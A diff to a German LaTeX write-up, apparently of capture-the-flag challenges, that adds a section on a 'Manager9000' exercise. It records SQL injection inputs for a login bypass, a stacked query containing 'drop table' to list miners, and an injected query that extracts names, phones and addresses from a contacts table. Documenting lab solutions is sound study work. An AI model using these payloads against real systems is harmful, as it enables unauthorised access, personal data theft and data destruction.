@@ -144,6 +144,21 @@ Hinter dem Bild ist ein zweites wesentlich kleineres Bild gespeichert, mit der Z
 $08:58:87$
 
 
+\section{Manager9000}
+
+\subsection{Schwachstelle finden}
+Die Seite ist SQL Injection gefährdet. Mit dem Eingabedaten $' OR '1'='1' --$ in Nickname und Passwort kann fälschlicherweise eingeloggt werden.
+
+\subsection{Wer schürft am meisten?}
+Mittels $' OR '1'='1' );  drop table id$  kann die gesamte Liste der Miner ausgegeben werden, da bei Syntaxfehlern der ausgeführte SQL-Code ausgegeben wird, kann hier einfach die Eingabe angepasst werden. Nun muss nur noch der/die stärkste/er herausgesucht werden.
+
+\subsection{Mein Wallet}
+
+SELECT id, name, phone, country, city, street, number FROM contacts WHERE (name LIKE '\%
+'OR '1'='1' ); SELECT id, name, phone, country, city, street, number FROM contacts ORDER BY name ;
+('
+\%' )
+
 \section{Beispiele}
 
 \subsection{Source Code formatieren}
